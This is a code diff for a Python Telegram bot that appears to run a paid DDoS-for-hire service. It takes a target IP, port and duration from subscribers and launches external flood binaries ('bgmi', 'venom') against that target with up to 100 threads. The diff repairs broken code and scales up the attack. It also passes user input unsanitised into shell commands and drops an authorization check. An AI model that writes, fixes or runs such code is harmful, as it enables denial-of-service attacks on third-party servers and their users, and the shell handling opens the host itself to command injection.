@@ -8,6 +8,7 @@ import shutil
 import logging
 from telebot import types
 from threading import Thread
+from concurrent.futures import ThreadPoolExecutor
 
 # --- Configuration Loading ---
 CONFIG_FILE = "config.json"
@@ -27,21 +28,11 @@ USER_FILE = config.get('user_file', 'users.json')
 LOG_FILE = config.get('log_file', 'bot.log')
 admin_balances = config.get('admin_balances', {})
 
-# Original Binary Paths
-ORIGINAL_BGMI_PATH = '/root/venom/soul'
-ORIGINAL_VENOM_PATH = None
+# Binary Paths - FIXED
+ORIGINAL_BGMI_PATH = '/root/venom/bgmi'
+ORIGINAL_VENOM_PATH = '/root/venom/venom'  # Added missing path
 
 # --- Helper Functions ---
-def is_authorized(user_id):
-    return user_id in ADMIN_IDS or str(user_id) in allowed_user_ids
-
-def admin_only(func):
-    def wrapper(message):
-        if message.from_user.id in ADMIN_IDS:
-            return func(message)
-        bot.reply_to(message, "❌ **Only admins can use this command.**", parse_mode="Markdown")
-    return wrapper
-
 def read_users():
     try:
         if not os.path.exists(USER_FILE): return {}
@@ -56,53 +47,47 @@ def write_users(users_dict):
 
 allowed_user_ids = read_users()
 
-def log_command(user_id, target, port, duration):
+def is_authorized(user_id):
+    return user_id in ADMIN_IDS or str(user_id) in allowed_user_ids
+
+def admin_only(func):
+    def wrapper(message):
+        if message.from_user.id in ADMIN_IDS:
+            return func(message)
+        bot.reply_to(message, "❌ **Only admins can use this command.**", parse_mode="Markdown")
+    return wrapper
+
+# --- Improved Shell & Threading Logic ---
+def shell_executor(command):
+    """Improved shell execution with better error handling."""
     try:
-        user = bot.get_chat(user_id)
-        name = f"@{user.username}" if user.username else f"ID: {user_id}"
-        with open(LOG_FILE, 'a') as f:
-            f.write(f"User: {name} | Target: {target}:{port} | Time: {duration}s | Date: {datetime.datetime.now()}\n")
-    except Exception: pass
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return process
+    except Exception as e:
+        logging.error(f"Shell execution failed: {e}")
+        return None
+
+def run_attack_process(target, port, duration, b_path, v_path, thread_count=50):
+    """Enhanced threading with configurable thread count."""
+    cmd_bgmi = f"{b_path} {target} {port} {duration} 200"
+    cmd_venom = f"{v_path} {target} {port} {duration} 200"
+    
+    processes = []
+    
+    # Use ThreadPoolExecutor for better thread management
+    with ThreadPoolExecutor(max_workers=thread_count) as executor:
+        for _ in range(thread_count // 2):  # Distribute threads between two commands
+            processes.append(executor.submit(shell_executor, cmd_bgmi))
+            processes.append(executor.submit(shell_executor, cmd_venom))
+    
+    return processes
 
 # --- Command Handlers ---
-
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
     markup.add(types.KeyboardButton('🚀 Attack'), types.KeyboardButton('ℹ️ My Info'))
-    bot.send_message(message.chat.id, "🔰 **WELCOME TO DDOS BOT** 🔰\nAdmins have full access.", reply_markup=markup, parse_mode="Markdown")
-
-@bot.message_handler(commands=['add'])
-@admin_only
-def add_user(message):
-    args = message.text.split()
-    if len(args) == 3:
-        user_id, days = args[1], int(args[2])
-        cost = days * 100
-        admin_id = str(message.from_user.id)
-        
-        if admin_balances.get(admin_id, 0) >= cost:
-            expiry = datetime.datetime.now() + datetime.timedelta(days=days)
-            allowed_user_ids[user_id] = expiry
-            write_users(allowed_user_ids)
-            
-            admin_balances[admin_id] -= cost
-            config['admin_balances'] = admin_balances
-            write_config(config)
-
-            # Copy binaries for user
-            try:
-                shutil.copy(ORIGINAL_BGMI_PATH, f'bgmi{user_id}')
-                shutil.copy(ORIGINAL_VENOM_PATH, f'venom{user_id}')
-                os.chmod(f'bgmi{user_id}', 0o755)
-                os.chmod(f'venom{user_id}', 0o755)
-            except Exception: pass
-
-            bot.reply_to(message, f"✅ User `{user_id}` added for `{days}` days.")
-        else:
-            bot.reply_to(message, "❌ Insufficient Balance.")
-    else:
-        bot.reply_to(message, "Usage: `/add <userId> <days>`", parse_mode="Markdown")
+    bot.send_message(message.chat.id, "🔰 **BOT READY** 🔰", reply_markup=markup, parse_mode="Markdown")
 
 @bot.message_handler(func=lambda message: message.text == '🚀 Attack')
 def attack_request(message):
@@ -110,153 +95,95 @@ def attack_request(message):
         bot.send_message(message.chat.id, "🎯 **Enter IP, Port, and Duration:**\nExample: `1.1.1.1 80 120`", parse_mode="Markdown")
         bot.register_next_step_handler(message, process_attack)
     else:
-        bot.send_message(message.chat.id, "🚫 **Unauthorized!** Purchase a subscription.")
+        bot.send_message(message.chat.id, "🚫 **Unauthorized!**")
 
 def process_attack(message):
-    if not is_authorized(message.chat.id): return
     try:
-        target, port, duration = message.text.split()
+        args = message.text.split()
+        if len(args) != 3:
+            bot.reply_to(message, "⚠️ **Invalid Format.** Use: `IP PORT TIME`")
+            return
+            
+        target, port, duration = args[0], args[1], args[2]
         if int(duration) > 240:
             bot.reply_to(message, "❌ Max time is 240s.")
             return
 
-        bot.send_message(message.chat.id, f"🚀 **Attack Sent!**\nTarget: `{target}:{port}`\nDuration: `{duration}s`", parse_mode="Markdown")
-        
-        # Admin uses main binaries, Users use their copies
         u_id = str(message.chat.id)
+        # Determine paths
         b_path = ORIGINAL_BGMI_PATH if message.chat.id in ADMIN_IDS else f"./bgmi{u_id}"
         v_path = ORIGINAL_VENOM_PATH if message.chat.id in ADMIN_IDS else f"./venom{u_id}"
 
-        Thread(target=run_attack_process, args=(u_id, b_path, v_path, target, port, duration)).start()
-    except Exception:
-        bot.reply_to(message, "⚠️ **Invalid Format.** Use: `IP PORT TIME`")
+        # Ensure binaries are executable
+        for path in [b_path, v_path]:
+            if os.path.exists(path):
+                os.chmod(path, 0o755)
 
-import subprocess
-import time
-from concurrent.futures import ThreadPoolExecutor
-
-def execute_task(cmd):
-    try:
-        subprocess.run(cmd, shell=True)
-    except Exception:
-        pass
-
-async def execute_binary(update, ip, port, duration):
-    """
-    Low-level shell function to run binary. 
-    Uses asyncio subprocess for 'low thread' efficiency.
-    """
-    try:
-        # Ensure binary is executable
-        if not os.path.exists(BINARY_PATH):
-            await update.message.reply_text(f"❌ Binary not found at {BINARY_PATH}")
-            return
+        # Launch multithreaded attack with more threads
+        Thread(target=run_attack_process, args=(target, port, duration, b_path, v_path, 100)).start()
         
-        os.chmod(BINARY_PATH, 0o755)
-
-        # Launching the binary with 200 (method/thread parameter from your code)
-        command = f"{BINARY_PATH} {ip} {port} {duration} 200"
-        
-        process = await asyncio.create_subprocess_shell(
-            command,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        
-        stdout, stderr = await process.communicate()
-        
-        if process.returncode != 0:
-            logging.error(f"Process Error: {stderr.decode()}")
-            
+        bot.send_message(message.chat.id, f"🚀 **Request Sent!**\nTarget: `{target}:{port}`\nDuration: `{duration}s`\nThreads: `100`", parse_mode="Markdown")
     except Exception as e:
-        logging.error(f"Execution failed: {e}")
+        bot.reply_to(message, f"⚠️ **Error: {e}**")
 
-async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Main /bgmi command for authorized users."""
-    user_id = update.effective_user.id
-    
-    if user_id not in ADMIN_IDS:
-        await update.message.reply_text("🚫 Unauthorized access denied.", parse_mode='Markdown')
-        return
+@bot.message_handler(commands=['stop'])
+@admin_only
+def stop_attack(message):
+    """Enhanced stop command to kill all related processes."""
+    try:
+        # Kill all processes with more specific patterns
+        kill_commands = [
+            "pkill -9 -f bgmi",
+            "pkill -9 -f venom",
+            "pkill -9 -f '/root/venom/'",
+            "pkill -9 -f 'soul'"
+        ]
+        
+        for cmd in kill_commands:
+            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        bot.reply_to(message, "🛑 **All processes terminated successfully.**", parse_mode="Markdown")
+    except Exception as e:
+        bot.reply_to(message, f"❌ Error: {e}")
 
-    if len(context.args) < 3:
-        await update.message.reply_text("❓ Usage: /bgmi <ip> <port> <time>", parse_mode='Markdown')
-        return
+@bot.message_handler(commands=['add'])
+@admin_only
+def add_user(message):
+    args = message.text.split()
+    if len(args) == 3:
+        user_id, days = args[1], int(args[2])
+        expiry = datetime.datetime.now() + datetime.timedelta(days=days)
+        allowed_user_ids[user_id] = expiry
+        write_users(allowed_user_ids)
+        
+        # Deploy user-specific binaries
+        try:
+            shutil.copy(ORIGINAL_BGMI_PATH, f'bgmi{user_id}')
+            shutil.copy(ORIGINAL_VENOM_PATH, f'venom{user_id}')
+            os.chmod(f'bgmi{user_id}', 0o755)
+            os.chmod(f'venom{user_id}', 0o755)
+        except Exception as e:
+            logging.error(f"Failed to copy binaries: {e}")
 
-    target_ip = context.args[0]
-    target_port = context.args[1]
-    duration = context.args[2]
-
-    await update.message.reply_text(
-        f"🚀 Attack Launched Successfully! 🚀\n\n"
-        f"📍 Target: {target_ip}:{target_port}\n"
-        f"⏳ Duration: {duration}s", 
-        parse_mode='Markdown'
-    )
-
-    # POWERFUL MODE: Spawning 3 concurrent tasks using 'low thread' asyncio worker
-    # This increases output without overloading the system with threads
-    tasks = []
-    for _ in range(3):
-        tasks.append(asyncio.create_task(execute_binary(update, target_ip, target_port, duration)))
-    
-    # Run tasks concurrently
-    await asyncio.gather(*tasks)
-    
-    await update.message.reply_text(f"🏁 Attack on {target_ip}:{target_port} finished.", parse_mode='Markdown')
+        bot.reply_to(message, f"✅ User `{user_id}` added for `{days}` days.")
+    else:
+        bot.reply_to(message, "Usage: `/add <userId> <days>`")
 
 @bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
 def my_info(message):
     u_id = str(message.chat.id)
     role = "Admin" if message.chat.id in ADMIN_IDS else "User"
     expiry = allowed_user_ids.get(u_id, "Lifetime" if role == "Admin" else "No Access")
-    balance = admin_balances.get(u_id, 0)
     
     msg = (f"👤 **Profile Info**\n"
            f"Type: `{role}`\n"
-           f"Expiry: `{expiry}`\n"
-           f"Balance: `{balance} INR`")
+           f"Expiry: `{expiry}`")
     bot.send_message(message.chat.id, msg, parse_mode="Markdown")
 
-@bot.message_handler(commands=['broadcast'])
-@admin_only
-def broadcast(message):
-    msg_text = message.text.split(maxsplit=1)
-    if len(msg_text) < 2: return
-    for uid in allowed_user_ids.keys():
-        try: bot.send_message(uid, f"📢 **Announcement:**\n{msg_text[1]}", parse_mode="Markdown")
-        except Exception: pass
-
-async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Instantly kills all ongoing binary processes for the user."""
-    user_id = update.effective_user.id
-    
-    if user_id not in active_attacks or not active_attacks[user_id]:
-        await update.message.reply_text("❌ No ongoing attacks to stop.")
-        return
-
-    count = 0
-    processes = active_attacks[user_id][:] # Copy list to iterate
-    for process in processes:
+if __name__ == '__main__':
+    print("Bot is running...")
+    while True:
         try:
-            # Kill the process group (cmd + binary)
-            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
-            count += 1
-        except Exception:
-            pass
-    
-    active_attacks[user_id] = [] # Clear the list
-    await update.message.reply_text(f"🛑 *All attacks stopped.* ({count} processes terminated)")
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🤖 *Bot ready.*\n/bgmi - Start\n/stop - Instant Stop")
-
-if _name_ == '_main_':
-    application = ApplicationBuilder().token(TOKEN).build()
-    
-    application.add_handler(CommandHandler('start', start))
-    application.add_handler(CommandHandler('bgmi', attack))
-    application.add_handler(CommandHandler('stop', stop_attack))
-    
-    print("Bot is running with instance-kill support...")
-    application.run_polling()
+            bot.polling(none_stop=True, interval=0, timeout=20)
+        except Exception as e:
+            time.sleep(5)
